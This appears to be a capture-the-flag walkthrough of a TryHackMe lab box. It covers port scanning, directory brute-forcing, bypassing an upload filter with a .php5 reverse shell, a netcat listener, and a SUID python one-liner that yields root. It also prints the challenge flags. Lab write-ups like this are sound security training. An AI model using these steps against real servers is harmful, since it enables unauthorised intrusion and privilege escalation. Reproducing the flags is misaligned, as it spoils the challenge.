ip address: 10.10.150.80

First step: Scan with nmap for open ports.
nmap -sV 10.10.150.80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Now I ll look for hidden directories. 
/robots.txt in the end of the ip address does not show any hidden directory, so I ll try with go buster.

gobuster dir -u 10.10.150.80 -w /usr/share/wordlists/dirb/big.txt 

This command calls the gobuster tool and searches for hidden directories with every word from that wordlist

/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.150.80/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.150.80/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.150.80/panel/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.150.80/uploads/]
Progress: 20469 / 20470 (100.00%)

This is what was found.
The panel directorys allows me to submit a file. 
And at the /uploads I can see every delivered file and maybe execute them.
So my first thought was to send a malicious coded file and execute it so I can get a shell
at the server.

With a firefox extension named "Wappalyzer" I saw that the programming language used is PHP.
So I ll send a malicious php file.

A .php file is not allowed to be send, so I ll use php5.
I searched for a php reverse-shell and changed the LHOSTS.
I need to open netcat to listen on the port I chose (1234).
nc -lvnp 1234
Success! Now I ll execute it from the uploads page.
Done. We re in.

Now I ll look for the flag in the user.txt.

I used the command:
find / -name user.txt

So I could find the directory to the txt file.

/var/www/user.txt
Here it is.

cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}

And I found the flag!

Now I ll try to privilege escalate.

find . -perm /4000 

WIth this command I can figure out tools that use root privileges.
If I send a command that uses root with these tools I can escalate to root.

Python is the weird tool to be in that permission.

/usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

I used this command to gain root.

$ /usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root


cd root
ls
cat root.txt

And the final flag is: THM{pr1v1l3g3_3sc4l4t10n}
